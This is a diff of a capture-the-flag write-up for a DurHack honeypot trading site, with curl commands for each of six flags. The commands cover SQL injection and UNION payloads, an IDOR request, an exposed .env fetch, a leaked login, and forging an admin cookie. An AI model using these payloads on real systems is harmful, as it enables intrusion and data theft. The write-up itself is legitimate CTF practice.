@@ -1,116 +1,104 @@
-# HoneyPot Holdings CTF – Flag Retrieval Guide
+# Flag 1
+The first flag we found was in the frontpage HEAD section as a comment, it is fairly easy to find.
 
-## Overview
-This walkthrough records the exact commands I used on 1 November 2025 from the Codex CLI to recover all six known flags from `http://team54-honeypot.durhack.qwerty.technology:8080`. All commands assume you have network access to the target from the workstation (no proxy required).
+```bash
+curl -s http://team54-honeypot.durhack.qwerty.technology:8080/ | grep -oP "FLAG\{.*?\}"
+```
 
----
+Outputs: FLAG{source_code_never_lies}
 
-## Flag 1 – Homepage Source Comment
+# Flag 2
+Our attention was next drawn to the login form, we assumed there was a possible SQL injection, so we tried that first, doing the common `'OR 1=1 --` strategy, revealed that indeed the form had SQL injection, and also leaked out the data to us. 
 
-1. Fetch the site landing page with `curl`:
-   ```bash
-   curl -i http://team54-honeypot.durhack.qwerty.technology:8080/
-   ```
-2. Inspect the HTML response (the flag is in a comment near the top of the document):
-   ```
-   <!-- FLAG: FLAG{source_code_never_lies} -->
-   ```
+```bash
+curl -s -d "username=' OR 1=1 -- &password=" http://team54-honeypot.durhack.qwerty.technology:8080/login \
+    | sed -n "112p" # to only output the affected line
+```
 
----
+We then tried to find out the tables, which we found a secret table in:
+```bash
+curl -sd "username=' UNION SELECT null, table_name, column_name FROM information_schema.columns WHERE table_schema=database() -- -&password=test" \
+    http://team54-honeypot.durhack.qwerty.technology:8080/login \
+| grep users\nsecrets
+```
 
-## Flag 2 – SQL Injection on `POST /login`
+So we outputted the data from there
+```bash
+curl -sd "username=' UNION SELECT id, secret_key, secret_value FROM secrets -- &password=test" \
+    http://team54-honeypot.durhack.qwerty.technology:8080/login \
+| grep -oP "FLAG\{.*?\}"
+```
 
-The login form concatenates user input directly into a SQL query, so we can use a UNION-based payload to extract arbitrary tables.
+Outputs: FLAG{union_based_injection_reveals_secrets}
 
-1. (Optional) Confirm the injection point leaks data by sending an always-true condition:
-   ```bash
-   curl -s -d "username=' OR 1=1 -- &password=test" \
-     http://team54-honeypot.durhack.qwerty.technology:8080/login
-   ```
-   The error banner lists user records, proving injectable SQL.
 
-2. Dump the `secrets` table row containing the admin flag:
-   ```bash
-   curl -s --data-urlencode \
-     "username=' UNION SELECT id, secret_key, secret_value FROM secrets LIMIT 1 OFFSET 2 -- -" \
-     --data-urlencode "password=test" \
-     http://team54-honeypot.durhack.qwerty.technology:8080/login | sed -n '112p'
-   ```
-   The response includes:
-   ```
-   Authentication failed for user: <strong>3 admin_flag FLAG{union_based_injection_reveals_secrets}</strong>
-   ```
+# Generating a valid login session
+We also found a users table, which included one user with a plain text password (while the rest were hashed),
+using this we logged in with that - for future commands, we also generate a session.txt file to make it easier:
 
-3. Record the flag:
-   ```
-   FLAG{union_based_injection_reveals_secrets}
-   ```
+elliot\_4430: elliot\_4430
 
----
+We can also take note of the other user id's we got from here to forge requests later.
 
-## Flag 3 – IDOR in Dashboard
 
-1. Authenticate using any valid session (e.g., the leaked `elliot_4430` credentials) or reuse the cookie from Flag 2.
-2. Request another user’s dashboard directly by altering the `userid` parameter:
-   ```bash
-   curl -s -b session.txt \
-     "http://team54-honeypot.durhack.qwerty.technology:8080/dashboard?userid=8080" |
-     grep -n "FLAG"
-   ```
-3. The rendered page includes:
-   ```
-   FLAG{direct_access_via_idor_parameter}
-   ```
+```bash
+curl -sc session.txt -d "username=elliot_4430&password=elliot_4430" \
+    http://team54-honeypot.durhack.qwerty.technology:8080/login
+```
 
----
 
-## Flag 4 – Insecure File Access (Draft Statement)
+# Flag 3
+Request another user’s dashboard directly by altering the `userid` parameter, we found these a tiny bit ago.
 
-1. While authenticated as any trader-level user, download the draft statement via the portal download endpoint:
-   ```bash
-   curl -i -b session.txt \
-     "http://team54-honeypot.durhack.qwerty.technology:8080/download?file=2025-Q3-draft.pdf"
-   ```
-2. The PDF body (or the saved file) contains:
-   ```
-   FLAG{directories_are_like_markets_they_go_up_and_down}
-   ```
+This flag is then in the personal notes.
 
----
+```bash
+curl -sb session.txt \
+    "http://team54-honeypot.durhack.qwerty.technology:8080/dashboard?userid=8080" \
+| grep -oP "FLAG\{.*?\}"
+```
 
-## Flag 5 – Exposed `.env` File
 
-1. The webroot allows direct access to the environment file:
-   ```bash
-   curl -s http://team54-honeypot.durhack.qwerty.technology:8080/.env
-   ```
-2. The response reveals:
-   ```
-   FLAG{dotenv_exposure_via_directory_traversal}
-   ```
+Outputs: FLAG{direct_access_via_idor_parameter}
 
----
 
-## Flag 6 – Privilege Escalation via Unsigned Cookie
+# Flag 4
+Checking for common paths revealed a `robots.txt`, and also a `.env` file, in this env file there was a flag in plaintext.
 
-1. Notice `/debug` shares how the application builds the `auth_data` cookie (base64-encoded JSON with no signature).
-   ```bash
-   curl -s http://team54-honeypot.durhack.qwerty.technology:8080/debug | head
-   ```
-2. Forge a CEO cookie and request the restricted statement directly (no session cookie needed):
-   ```bash
-   curl -i \
-     -H 'Cookie: auth_data=eyJ1c2VyX2lkIjo3Nzc3LCJ1c2VybmFtZSI6InJhbnNvbV83Nzc3Iiwicm9sZSI6ImNlbyJ9' \
-     "http://team54-honeypot.durhack.qwerty.technology:8080/download?file=2025-Q3.pdf"
-   ```
-3. The final PDF includes:
-   ```
-   FLAG{admin_access_confirmed_privilege_escalation_successful}
-   ```
+```bash
+curl -s http://team54-honeypot.durhack.qwerty.technology:8080/.env | grep -oP "FLAG\{.*?\}"
+```
 
----
+Outputs: FLAG{dotenv_exposure_via_directory_traversal}
 
-## Notes
-- Flags 1, 5, and 6 are reachable without a valid session; the others require any trader-level login (`elliot_4430` works).
-- The UNION payload can enumerate additional secrets by adjusting the `OFFSET` value.
-- Always sanitize inputs in production code—parameterized queries would prevent this issue.
+
+# Flag 5
+Now pivoting back to the page, since we found the `robots.txt`, we had a clue on potential filenames, it allowed us to download the draft, but not the final version (as that required CEO permission)
+
+This contained the next flag.
+
+```bash
+curl -sb session.txt "http://team54-honeypot.durhack.qwerty.technology:8080/download?file=2025-Q3-draft.pdf" \
+| grep -oP "FLAG\{.*?\}" # works, but we found it by just opening the PDF
+```
+
+
+
+# Flag 6 cookies
+Since we had a clue that we were missing permissions from trying to access `2025-Q3.pdf`, we turned to the session cookies, where we discovered that our auth data looks kind of like base64, which we then confirmed, doing this showed that it just is a JSON blob with includes a role field, changing this field to be `ceo` instead of `trader` provided us with access to this final file, which also had the final key.
+
+```bash
+grep -oP "auth_data(.*)" < session.txt | cut -f 2 | base64 -d \
+# {"user_id":4430,"username":"elliot_4430","role":"trader"}
+| sed "s/trader/ceo/" \
+# {"user_id":4430,"username":"elliot_4430","role":"ceo"}
+| base64
+
+# THEN
+# manually replace the base64 auth_data key in session.txt (i was too lazy to come up with a command for this)
+
+curl -sb session.txt "http://team54-honeypot.durhack.qwerty.technology:8080/download?file=2025-Q3.pdf" \
+| grep -oP "FLAG\{.*?\}" # works, but we found it by just opening the PDF
+```
+
+Outputs: FLAG{admin_access_confirmed_privilege_escalation_successful}
